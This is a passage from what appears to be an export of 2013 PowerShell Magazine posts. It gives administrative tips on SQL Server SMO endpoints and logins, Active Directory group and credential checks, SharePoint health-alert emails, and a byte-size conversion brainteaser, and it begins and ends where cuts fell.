[string]$computername=$env:COMPUTERNAME, [string]$instancename, [string]$endpointname, [int]$endpointport ) Begin { Write-Verbose \"Loading SQL SMO\" Add-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" Add-Type -AssemblyName \"Microsoft.SqlServer.ConnectionInfo, Version=11.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" } Process { try { $connection = New-Object Microsoft.SqlServer.Management.Common.ServerConnection -ArgumentList $ComputerName $connection.applicationName = \"PowerShell SQL SMO\" if ($instancename) { Write-Verbose \"Connecting to SQL named instance\" $connection.ServerInstance = \"${env:computername}\\${instancename}\" } else { Write-Verbose \"Connecting to default SQL instance\" } $connection.StatementTimeout = 0 $connection.Connect() $smo = New-Object Microsoft.SqlServer.Management.Smo.Server -ArgumentList $connection } catch { Write-Error $_ } try { if (!($smo.Endpoints[$endpointname])) { if (!((Get-SQLEndPoint -computername $computername -instancename $instancename).ListenerPort -contains $endpointport)) { Write-Verbose \"Creating a mirroring endpoint named ${endpointname} at port ${endpointport}\" $SQLEndPoint = New-Object Microsoft.SqlServer.Management.Smo.Endpoint -ArgumentList $smo, $endpointname $SQLEndPoint.EndpointType = [Microsoft.SqlServer.Management.Smo.EndpointType]::DatabaseMirroring $SQLEndPoint.ProtocolType = [Microsoft.SqlServer.Management.Smo.ProtocolType]::TCP $SQLEndPoint.Protocol.Tcp.ListenerPort = $endpointport $SQLEndPoint.Payload.DatabaseMirroring.ServerMirroringRole = [Microsoft.SqlServer.Management.Smo.ServerMirroringRole]::All $SQLEndPoint.Create() $SQLEndPoint.Start() $smo.Endpoints[$endpointname] } else { Write-Error \"An endpoint with specified port number ${endpointport} already exists\" } } else { Write-Error \"An endpoint with name ${endpointname} already exists\" } } catch { Write-Error $_ } } } The way we use this function is simple. ``` #To create an endpoint on the local computer with default SQL instance New-SQLMirroringTCPEndpoint -endpointname TestEndPoint -endpointport 8888 #To create an endpoint on a remote computer with a named SQL instance New-SQLMirroringTCPEndpoint -computername server01 -instancename mySQLInstance -endpointname testendpoint -endpointport 9999 ``` [1]: http://msdn.microsoft.com/en-us/library/microsoft.sqlserver.management.smo.endpoint.create.aspx [2]: http://msdn.microsoft.com/en-us/library/microsoft.sqlserver.management.smo.endpoint.aspx [3]: /tag/smo/ [4]: /2013/06/03/pstip-list-all-endpoints-in-a-sql-deployment/","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/10/pstip-creating-a-sql-tcp-mirroring-endpoint-in-smo-and-powershell/","tags":["SQL","Tips and Tricks"],"title":"#PSTip Creating a SQL TCP mirroring endpoint with SMO and PowerShell"},{"categories":["Tips and Tricks"],"contents":"A co-worker had asked me a question about why the SQLPS module was not available for importing immediately after an automated install of SQL using a PowerShell script. Within this script, he was installing SQL as step 1 and then in step 2, he needs to use SQLPS module for setting some SQL configuration. However, when the script came to step 2, it complained that the SQLPS module was not found.\nIf you have worked on SQL PowerShell module, you may be aware of the fact that they store the module in Program Files folder for SQL Server and they update the PSModulePath system environment variable. But, this change won’t be available to PowerShell unless you reopen the PowerShell console. In a sequential execution flow, this is not an option.\nHere is how we solved the problem:\n$env:PSModulePath = [System.Environment]::GetEnvironmentVariable(\"PSModulePath\",\"Machine\")   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/06/pstip-refresh-the-psmodulepath-environment-variable-without-re-opening-console/","tags":["Tips and Tricks"],"title":"#PSTip Refresh the PSModulePath environment variable without re-opening console"},{"categories":["Tips and Tricks"],"contents":"In Windows, you get a message about the CapsLock status when logging on to Windows OS and with CapsLock on. You see this kind of experience in many other applications including web applications.\nA similar experience, if not the same, can be provided in a simple manner when asking for password input using Read-Host cmdlet in a script.\nRead-Host -Prompt \"Enter Password $(if([console]::capslock){'(CapsLock is ON)'})\"  Here is how it looks:\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/05/pstip-provide-capslock-status-in-read-host-prompt/","tags":["Tips and Tricks"],"title":"#PSTip Provide CapsLock status in Read-Host prompt"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nBefore we make an attempt at creating a new database mirroring endpoint, we need to verify if an endpoint with the given name and/or port already exists. We cannot create an endpoint with the same name or at the same port number. So, how do we validate this?\nFor checking if an endpoint with the same name exists or not, we can simply index into the Endpoints property of the SQL SMO Server class.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=11.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $smo = New-Object Microsoft.SqlServer.Management.Smo.Server -ArgumentList $env:computername $smo.endpoints[\"MyEndPoint\"]  The above code returns the endpoint object, if it exists. We can use this as a condition to check the endpoint existence. For example,\nif ($smo.endpoints[\"MyEndPoint\"]) { #Do something }  But, how do we check if the port number we intend to use for the new endpoint is already in use or not? Well, let us use the Get-SQLEndpoint function we created in an earlier tip.\nif (!((Get-SQLEndpoint -ComputerName \"MySQLServer\" -InstanceName \"MyInstance\").ListenerPort -contains 7777)) { #Create endpoint } else { Write-Error \"An endpoint with port number 7777 already exists\" }  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/04/pstip-check-if-a-sql-endpoint-exists-or-not/","tags":["SQL","Tips and Tricks"],"title":"#PSTip Check if a SQL endpoint exists or not"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWhen working with SQL Server database mirroring, it is desired to understand how to create and troubleshoot database endpoints. As with many other things, we can use SQL SMO to work with endpoints. In today’s tip, I will show you how to retrieve all database endpoints including the mirroring endpoints.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=11.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $smo = New-Object Microsoft.SqlServer.Management.Smo.Server -ArgumentList $env:computername $smo.endpoints  The above code retrieves all endpoints on the local SQL server’s default instance. Now, let us extend the above code to retrieve database endpoints from any SQL Server in the network and from any instance.\nFunction Get-SQLEndpoint { [CmdletBinding()] param ( [string]$ComputerName=$env:COMPUTERNAME, [string]$InstanceName ) Begin { Write-Verbose \u0026quot;Loading SQL SMO\u0026quot; Add-Type -AssemblyName \u0026quot;Microsoft.SqlServer.Smo, Version=11.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; Add-Type -AssemblyName \u0026quot;Microsoft.SqlServer.ConnectionInfo, Version=11.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; } Process { try { $connection = New-Object Microsoft.SqlServer.Management.Common.ServerConnection -ArgumentList $ComputerName $connection.applicationName = \u0026quot;PowerShell SQL SMO\u0026quot; if ($InstanceName) { Write-Verbose \u0026quot;Connecting to SQL named instance\u0026quot; $connection.ServerInstance = \u0026quot;${ComputerName}\\${InstanceName}\u0026quot; } else { Write-Verbose \u0026quot;Connecting to default SQL instance\u0026quot; } $connection.StatementTimeout = 0 $connection.Connect() $smo = New-Object Microsoft.SqlServer.Management.Smo.Server -ArgumentList $connection $smo.Endpoints | Select Name, EndPointType, ProtocolType, EndpointState, @{Name=\u0026quot;ListenerPort\u0026quot;;Expression={if ($_.ProtocolType -eq \u0026quot;TCP\u0026quot;) {$_.Protocol.TCP.ListenerPort} else {$_.Protocol.HTTP.ListenerPort}}} } catch { Write-Error $_ } } }  You can use this function as shown below.\nGet-SQLEndpoint -ComputerName \"SQL-SERVER-01\" -InstanceName \"MyInstance\" Get-SQLEndpoint -ComputerName \"SQL-SERVER-01\" -InstanceName \"MyInstance\" | Where-Object { $_.EndPointType -eq \"DatabaseMirroring\" }   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/03/pstip-list-all-endpoints-in-a-sql-deployment/","tags":["SQL","Tips and Tricks"],"title":"#PSTip List all endpoints in a SQL deployment"},{"categories":["News"],"contents":"We are happy to announce that PowerShell Magazine is an “Alliance Media Partner” for the TechMentor Las Vegas conference.\nSurrounded by your fellow IT professionals, TechMentor provides you with immediately usable IT education that will keep you relevant in the workforce. Learn how you can build a more productive IT environment at TechMentor Las Vegas, September 30-October 4–bring the IT issues that keep you up at night and prepare to leave this event with the answers, guidance, and training you need.\nCheck out the dedicated track for Windows PowerShell.\nObviously there are a ton of other great sessions aimed at helping you solve the real-world IT challenges you are facing today. Plus, TechMentor is a great opportunity to meet your favorite tech experts like Don Jones, Greg Shields, Jeffery Hicks, Mark Minasi, and Jason Helmick. I know I always look forward to meeting fellow IT Pros and chatting about what projects they’re working on or current issues they’re facing.\nSPECIAL OFFER: As a PowerShell Magazine reader, you get a $400 discount on the 5-day package. Use a priority code TMVG4 during the registration process.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/03/powershell-magazine-teams-up-again-with-the-techmentor-conference/","tags":["News","conferences"],"title":"PowerShell Magazine teams up again with the TechMentor conference"},{"categories":["News"],"contents":"We are all eager to see what Microsoft will announce at the TechEd North America 2013 conference that starts on Monday. You\u0026rsquo;ve probably heard about changes coming in Windows 8.1, but what about changes in Windows Server and System Center? What sessions should you attend, if you are interested in the future of Windows Server, System Center, and Windows Azure? The Content Catalog gives us a clue–there are a lot of sessions with “to be Announced” in the title. Windows PowerShell can help us get a list of those super secretive sessions and a little bit more details about them.\nWe\u0026rsquo;ll use the web cmdlets–Invoke-RestMethod and Invoke-WebRequest–introduced in Windows PowerShell 3.0. The starting point is the TechEd NA 2013’s RSS feed. It doesn’t expose the info about dates and rooms, so we need to use the Invoke-WebRequest cmdlet and filtering to scrape the needed information. Then, we\u0026rsquo;ll create a custom object combining the properties we want and pipe the output to a grid view using the Out-GridView cmdlet where we can further sort and filter the sessions.\nNote: This tip requires PowerShell 3.0 or above.\n$irm = Invoke-RestMethod -Uri 'http://channel9.msdn.com/Events/TechEd/NorthAmerica/2013/RSS' $irm | where {$_.Title -match 'to be Announced'} | foreach { $iwr = Invoke-WebRequest -Uri $_.link $date = $iwr.AllElements | where {$_.tagName -eq 'li' -and $_.class -eq 'date'} $room = $iwr.AllElements | where {$_.tagName -eq 'li' -and $_.class -eq 'room'} [PSCustomObject]@{ Date = $date.outertext -replace '^date: ' Room = $room.innerText Presenter = $_.Creator Link = $_.Link Category = $_.Category } } | Out-GridView  This is how the output looks like:\nUpdate: All titles for “to be Announced” sessions have been revealed:\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/01/teched-north-america-2013-sessions-you-dont-want-to-miss/","tags":["conferences"],"title":"TechEd North America 2013 sessions you don’t want to miss"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nFor regular reporting and auditing purposes, it is always desired to capture the SQL last backup dates. SQL SMO database properties give us this information.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $smo = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName $smo.Databases | Select Name, LastBackupDate, LastLogBackupDate, LastDifferentialBackupDate  The above code gives information about all databases on the local SQL server. If you want to filter it down to a specific database, you can do that using the following command.\n$smo.Databases[\"MyDB\"] | Select LastBackupDate, LastLogBackupDate, LastDifferentialBackupDate   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/31/pstip-retrieving-sql-database-last-backup-dates-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Retrieving SQL database last backup dates using SMO"},{"categories":["SharePoint","Tips and Tricks"],"contents":"SharePoint 2010 administrators are probably familiar with the following screenshot–you open the Central Administration page and you’re presented with a red Health Analyzer alert.\nClicking the ‘View these issues’ link takes you to a page that lists all items that needs an attention.\nChecking the health alerts page each day can be a daunting task and you might also forget to do so. To avoid that, and to enable multiple team members to be aware of the alerts, you can send the alerts by email. The Health list view (All Reports) is configured to list all items with a Severity not equal to Success (4).\nUsing the following code, you can read all items, and generate an email that you can send to your team members. Put it in a daily scheduled task on the SharePoint server and you’re good to go.\nif ($PSVersionTable) {$Host.Runspace.ThreadOptions = 'ReuseThread'} Add-PSSnapin Microsoft.SharePoint.PowerShell -ErrorAction SilentlyContinue # get the health reports list $ReportsList = [Microsoft.SharePoint.Administration.Health.SPHealthReportsList]::Local $FormUrl = '{0}{1}?id=' -f $ReportsList.ParentWeb.Url, $ReportsList.Forms.List.DefaultDisplayFormUrl $body = $ReportsList.Items | Where-Object {$_['Severity'] -ne '4 - Success'} | ForEach-Object { New-Object PSObject -Property @{ Url = \u0026quot;\u0026amp;lt;a href='$FormUrl$($_.ID)'\u0026amp;gt;$($_['Title'])\u0026amp;lt;/a\u0026amp;gt;\u0026quot; Severity = $_['Severity'] Category = $_['Category'] Explanation = $_['Explanation'] Modified = $_['Modified'] FailingServers = $_['Failing Servers'] FailingServices = $_['Failing Services'] Remedy = $_['Remedy'] } } | ConvertTo-Html | Out-String # creating clickable HTML links $body = $body -replace '\u0026amp;lt;','\u0026amp;lt;' -replace '\u0026amp;gt;','\u0026amp;gt;' -replace '\u0026amp;quot;','\u0026quot;' $params = @{ To = 'you@domain.com','manager@domain.com' From = 'SPHealth@domain.com' Subject = 'Daily Health Analyzer report' SmtpServer = 'smtp1' Body = $body BodyAsHtml = $true } Send-MailMessage @params This is how it looks in Outlook (partial view).\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/30/pstip-getting-sharepoint-2010-health-analyzer-alerts-report-by-email/","tags":["Tips and Tricks","SharePoint"],"title":"#PSTip Getting SharePoint 2010 Health Analyzer alerts report by email"},{"categories":["Brainteaser"],"contents":"The task was to convert a number to the size units without using the built-in multipliers. Thank you all for taking the time to participate in this teaser.\nNow, let’s present the solution we had in mind. Starting with PowerShell 3.0, we now have two new bitwise arithmetic operators: shift-left (shl) and shift-right (shr). You can read more about them in the about_Comparison_Operators help topic.\nThe solution to this teaser is using the shift-right operator to convert the value of given number (representing a value in bytes).\nGenerally speaking, shifting right a number divides it by 2 and rounds the number down. Each division takes the result of the last operation and divides it again by 2.\nPS\u0026gt; 100 -shr 1 50 PS\u0026gt; 100 -shr 2 25 PS\u0026gt; 100 -shr 3 12 Now, let’s take the value of 1KB: 1024. To get to 1024 we need to raise 2 in the power of 10. For 1MB (1048576), we need to raise it in the power of 20. 30 for 1GB, 40 for 1PB and so on and so forth.\nPS\u0026gt; [math]::Pow(2,10) 1024 PS\u0026gt; [math]::Pow(2,20) 1048576 PS\u0026gt; [math]::Pow(2,30) 1073741824 We can use the values 10, 20, 30… and shift-right by them to get the corresponding unit sizes in KB, MB, GB…. We will use the value of 13947906293.76 (that’s 12.99GB, actually).\n$value = 13947906293.76 # get the value in KB PS\u0026gt; $value -shr 10 13621002 # get the value in MB PS\u0026gt; $value -shr 20 13301 # get the value in GB PS\u0026gt; $value -shr 30 12 If you happen to manage Exchange 2007/2010 you are probably familiar with the size formatting ToKB/ToMB/ToGB/ToTB methods. Actually I owe the idea for this teaser to the Exchange team–they calculate the requested size by shifting right the value.\nThe formatting methods are available on ByteQuantifiedSize objects ([Microsoft.Exchange.Data.ByteQuantifiedSize]).\nHere’s a list of ByteQuantifiedSize properties of a Mailbox object:\n(Get-Mailbox shay).PSObject.Properties | Where-Object {$_.TypeNameOfValue -like \u0026quot;*ByteQuantifiedSize*\u0026quot;} | Format-Table name Name ---- ProhibitSendQuota ProhibitSendReceiveQuota RecoverableItemsQuota RecoverableItemsWarningQuota IssueWarningQuota RulesQuota ArchiveQuota ArchiveWarningQuota MaxSendSize MaxReceiveSize To format the size of ByteQuantifiedSize property, you refer to its Value property and then to one of the above methods:\nPS\u0026gt; $mbx.ArchiveQuota IsUnlimited Value ----------- ----- False 50 GB (53,687,091,200 bytes) PS\u0026gt; $mbx.ArchiveQuota.Value | Get-Member TypeName: Microsoft.Exchange.Data.ByteQuantifiedSize Name MemberType Definition ---- ---------- ---------- CompareTo Method int CompareTo(Microsoft.Exchange.Data.ByteQuantifiedSize other), int IComparable.CompareTo(... Equals Method bool Equals(System.Object obj), bool Equals(Microsoft.Exchange.Data.ByteQuantifiedSize other) GetHashCode Method int GetHashCode() GetType Method type GetType() RoundUpToUnit Method uint64 RoundUpToUnit(Microsoft.Exchange.Data.ByteQuantifiedSize+Quantifier quantifier) ToBytes Method uint64 ToBytes() ToGB Method uint64 ToGB() ToKB Method uint64 ToKB() ToMB Method uint64 ToMB() ToString Method string ToString(), string ToString(string format), string ToString(string format, System.IF... ToTB Method uint64 ToTB() PS\u0026gt; $mbx.ArchiveQuota.Value.ToGB() 50 Now to the prize. Congratulations Jaap Brasser and Rob Campbell, you get to take with you a copy of the Windows Server 2012 Automation with PowerShell Cookbook eBook. We would like to thank again Packt Publishing for the eBooks.\nJaap and Rob, in the best commmunity spirit, came up with the solution that was the shortest one that returns the right results for all five supported unit sizes:\nPS\u0026gt; $s = 12345678964561111 PS\u0026gt; 1..5|%{[long](($s/=1024)-.5)} 12056327113829 11773756947 11497809 11228 10  Let’s rewrite our solution in the same manner:\nPS\u0026gt; 1..5|%{$s -shr 10*$_}  Amazingly, we can even remove all spaces, and it’ll still work:\nPS\u0026gt; 1..5|%{$s-shr10*$_}  See you in the next brainteaser. 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/27/converting-to-size-units-our-solution-and-the-winner/","tags":["Brainteaser"],"title":"Converting to size units – our solution and the winner"},{"categories":["Active Directory","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nToday I was asked if there was a way to find out which groups have the same group members. This is possible by parsing the output of a DirectoryServices.DirectorySearcher or [adsisearcher] class. The following example groups the results and sorts by the number of groups that have the same group membership:\n$Searcher = [adsisearcher]'(member=*)' $Searcher.PageSize = 500 $Searcher.FindAll() | ForEach-Object { New-Object -TypeName PSCustomObject -Property @{ DistinguishedName = $_.Properties.distinguishedname[0] Member = $_.Properties.member -join ';' } } | Group-Object -Property member | Where-Object {$_.Count -gt 1} | Sort-Object -Property Count -Descending  The output looks similar to this:\nCount Name Group ----- ---- ----- 15 CN=Domain Users,CN=Use... {@{distinguishedname=CN=test123... 13 CN=Domain Users,CN=Use... {@{distinguishedname=CN=test456... To get the group names and the members, the output from the Group-Object cmdlet should be expanded by utilizing Select-Object –ExpandProperty. This output will be piped to Export-Csv which will generate a report containing all groups in Active Directory that have exactly the same members: $Searcher = [adsisearcher]'(member=*)' $Searcher.PageSize = 500 $Searcher.FindAll() | ForEach-Object { New-Object -TypeName PSCustomObject -Property @{ DistinguishedName = $_.Properties.distinguishedname[0] Member = $_.Properties.member -join ';' } } | Group-Object -Property member | Where-Object {$_.Count -gt 1} | Sort-Object -Property Count -Descending | Select-Object -ExpandProperty Group | Export-Csv -Path GroupWithIdenticalMembership.csv -NoTypeInformation The output of this command is as follows: ![](/images/Jaap_AD1.png)","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/24/pstip-find-all-groups-with-same-group-members-in-active-directory/","tags":["Active Directory","Tips and Tricks"],"title":"#PSTip Find all groups with same group members in Active Directory"},{"categories":["Active Directory","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWhen you need to manage Active Directory, the Active Directory PowerShell module is the first admin choice as it provides many cmdlets for administering and interfacing with various AD objects. For example, to get the members of an AD group you’d use the Get-ADGroupMember cmdlet. But what do you do when the AD module is not available in your environment?\nStarting with .NET 3.5 you can load the System.DirectoryServices.AccountManagement assembly and use its classes and types to get the members of the group. With the following snippet you can get all members of an AD group, including nested members.\n$Recurse = $true $GroupName = 'Domain Admins' Add-Type -AssemblyName System.DirectoryServices.AccountManagement # use the 'Machine' ContextType if you want to retrieve local group members # for possible values of the numeration, visit # http://msdn.microsoft.com/en-us/library/system.directoryservices.accountmanagement.contexttype.aspx $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($ct,$GroupName) $group.GetMembers($Recurse) One important thing to keep in mind, the returned collection does not contain group objects when the recursive flag is set to true.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/","tags":["Active Directory","Tips and Tricks"],"title":"#PSTip Retrieve group membership of an Active Directory group recursively"},{"categories":["Tips and Tricks"],"contents":"PowerShell provides a nice way of testing if a set of credentials are correct. This can be done by using the System.DirectoryServices.AccountManagement namespace. Earlier this year Shay discussed how this class can be used to verify Active Directory credentials, PSTip Validating Active Directory user credentials. However it is also possible to verify local accounts. An example of how to test the local user account credentials:\nAdd-Type -AssemblyName System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$env:COMPUTERNAME) $DS.ValidateCredentials('jaapbrasser', 'Secret01')  The result of this code is a Boolean value, reporting back either True or False. To make this simpler I wrote an advanced function that verifies local user credentials. It is available in the Technet Script Repository: Test-LocalCredential\nfunction Test-LocalCredential { [CmdletBinding()] Param ( [Parameter(Mandatory=$true)] [string]$UserName, [string]$ComputerName = $env:COMPUTERNAME, [Parameter(Mandatory=$true)] [string]$Password ) Add-Type -AssemblyName System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$ComputerName) $DS.ValidateCredentials($UserName, $Password) }  This function can be called as shown in the next example:\nPS\u0026gt; Test-LocalCredential -UserName jaapbrasser -Password Secret01 True ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/22/pstip-verify-local-sam-store-account-credentials/","tags":["Tips and Tricks"],"title":"#PSTip Verify local SAM store account credentials"},{"categories":["Active Directory","Tips and Tricks"],"contents":"The System.DirectoryServices.AccountManagement namespace provides a nice way of testing if a set of Active Directory credentials are correct (also discussed in PSTip Validating Active Directory user credentials ). Another method is utilizing the System.DirectoryServices.DirectoryEntry class to create an LDAP connection to the default domain. By default every user should be able to access this entry and therefore this can be used to verify the Active Directory credentials of a user account. The following example will show the basic workings of the class.\nPS \u0026gt; $DomainDN = ([adsi]'').distinguishedName PS \u0026gt; New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$DomainDN\",'jaapbrasser','Secret01') format-default : The following exception occurred while retrieving member \"distinguishedName\": \"The user name or password is incorrect.\" + CategoryInfo : NotSpecified: (:) [format-default], ExtendedTypeSystemException + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand  Unlike System.DirectoryServices.AccountManagement, the output is not $true or $false. Instead, an error is generated if the class is provided with incorrect credentials. If the credentials are correct the returned object will contain the distinguishedName property, this property will be used to create the Boolean output.\n$DomainDN = ([adsi]'').distinguishedName $Account = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$DomainDN\",'jaapbrasser','Secret01') [bool]$Account.distinguishedName  Now we get output similar to what the System.DirectoryServices.AccountManagement class provides. This is obviously more work to implement but you can wrap this in a function and reuse it when needed. An advantage of this class is that no additional DLLs are required for this script to function.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/21/pstip-verify-active-directory-account-credentials-using-system-directoryservices-directoryentry/","tags":["Active Directory","Tips and Tricks"],"title":"#PSTip Verify Active Directory account credentials using System.DirectoryServices.DirectoryEntry"},{"categories":["Brainteaser"],"contents":"Hello everyone! After some time, here is the brand new brain teaser. We hope you will like the challenge. 🙂\nIn PowerShell, we can convert from bytes to KB, MB, GB, TB, and PB using the multipliers. For example,\n$size = 123456789 $size / 1KB $size / 1MB $size / 1GB $size / 1TB $size / 1PB  Now, here is a task for you. You need to find a way to perform the above conversion without using any of the above PowerShell multipliers that is KB, MB, GB, TB, and PB. Here are some more rules:\n  If the result contains decimal point, round the number down. For example: 12.99 should become 12.\n  All versions of PowerShell are allowed, shortest way wins.\n  We teamed up with Packt Publishing to offer the winner of this contest a copy of Windows Server 2012 Automation with PowerShell Cookbook eBook.\nHere is a quick overview of this book:\n• Extend the capabilities of your Windows environment\n• Improve the process reliability by using well defined PowerShell scripts\n• Full of examples, scripts, and real-world best practices\nThis contest closes by Saturday, May 25. Wear your PowerShell wizard hat and post your answers in the Comments section. The winner will be announced next Monday.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/20/converting-to-size-units-kb-mbgbtb-and-pb-without-using-powershell-multipliers/","tags":["BrainTeaser"],"title":"Converting to size units (KB, MB,GB,TB, and PB) without using PowerShell multipliers"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nThere was a question on StackOverflow about adding local users to SQL Server logins. I provided an answer to that and realized from a user’s comment that the SMO method to create a SQL login works only in a specified manner.\nSo, in this tip, I will show you the SMO way of adding local users to SQL Server logins.\nAdd-Type -AssemblyName \u0026quot;Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; Add-Type -AssemblyName \u0026quot;Microsoft.SqlServer.ConnectionInfo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; $conn = New-Object Microsoft.SqlServer.Management.Common.ServerConnection -ArgumentList $env:ComputerName $conn.applicationName = \u0026quot;PowerShell SMO\u0026quot; $conn.ServerInstance = \u0026quot;.\\SQLEXPRESS\u0026quot; $conn.StatementTimeout = 0 $conn.Connect() $smo = New-Object Microsoft.SqlServer.Management.Smo.Server -ArgumentList $conn $SqlUser = New-Object -TypeName Microsoft.SqlServer.Management.Smo.Login -ArgumentList $smo,\u0026quot;${env:ComputerName}\\JohnDoe\u0026quot; $SqlUser.LoginType = 'WindowsUser' $sqlUser.PasswordPolicyEnforced = $false $SqlUser.Create() In the above code snippet, observe the way we specified (line 10) the username for the login. It needs to be prefixed with the computer name and not just ‘localhost’.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/17/pstip-adding-local-users-to-sql-server-logins-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Adding local users to SQL Server Logins using SMO"},{"categories":["News"],"contents":"On May 22nd, 2013, MVP Systems Software is hosting a free webinar on introduction to PowerShell 3.0. PowerShell MVP and a well known author Jeffery Hicks will be presenting this.\nHere is an abstract of what you can expect from the event.\nPowerShell 3.0 continues to build on the solid foundation of PowerShell 2.0. Today, IT Pros have a set of even more powerful tools to add to their admin toolbox. If you’re wondering about all the fuss surrounding PowerShell 3.0, PowerShell MVP and author Jeffery Hicks will enlighten you. In this session, he will share with you his favorite PowerShell 3.0 commands and demonstrate why you should be managing your environment with PowerShell today.\nThe registration for this event is free.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/16/get-to-know-powershell-3-0-with-jeffery-hicks/","tags":["News"],"title":"Get to know PowerShell 3.0 with Jeffery Hicks"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn an earlier tip, we looked at how to verify if a SQL database is mirrored. Continuing this series on SQL SMO tips series, let us look at how we can list the SQL database mirroring partner information. I find this information quite helpful when managing the SQL Server mirroring. The database class in SQL SMO has a property called MirroringPartner. This provides us the information of the Database Engine instance that is the partner server for database mirroring.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $smo = New-Object Microsoft.SqlServer.Management.Smo.Server $env:COMPUTERNAME $smo.Databases['MyDB'].MirroringPartner  The above code snippet returns the mirroring partner FQDN along with the TCP port number. In case you need only the name of the SQL Server instance hosting the mirroring partner, you can use the following code.\n$smo.Databases['MyDB'].MirroringPartnerInstance  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/14/pstip-list-sql-database-mirroring-partner-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip List SQL database mirroring partner using SMO"},{"categories":["Tips and Tricks"],"contents":"So, in your scripts you want to gather information from the user who runs it and you use the Read-Host cmdlet.\nPS\u0026gt; Read-Host Please enter your name  This of course works most of time but there are cases where it won’t work. One case is when the console has been launched using the NonInteractive switch. When that happens you will get this error:\nRead-Host : Windows PowerShell is in NonInteractive mode. Read and Prompt functionality is not available.  How can you tell if the console allows user interaction? One way to avoid that is to detect whether the host that runs the script has been launched in non-interactive mode. You can find the switches and arguments used to launch your console using the Environment.GetCommandLineArgs method. With the GetCommandLineArgs method you can get the array of the command-line arguments for the current process.\nC:\\\u0026gt; powershell -NoProfile -NoLogo -NonInteractive -Command \"[Environment]::GetCommandLineArgs()\" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -NoLogo -NonInteractive -Command [Environment]::GetCommandLineArgs()  The array includes the executable path along with the command-line arguments used to invoke it (if any). Now we can use that list to check if one of the arguments starts with ‘-noni’ . We check for ‘-noni*’ because there are two ways to specify the the NonInteractive switch, using it’s full name, or using a its short version. Using a wildcard pattern covers both cases. We then cast the result to a Boolean so we can have a True/False result.\nNote that this will work only for console based hosts (powershell.exe), not in the ISE.\n[bool]([Environment]::GetCommandLineArgs() -like '-noni*')  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/05/13/pstip-detecting-if-the-console-is-in-interactive-mode/","tags":["Tips and Tricks"],"title":"#PSTip Detecting if the console is in Interactive mode"},{"categories":["How To"],"contents":"Earlier this year, Microsoft released the Windows PowerShell 3.0 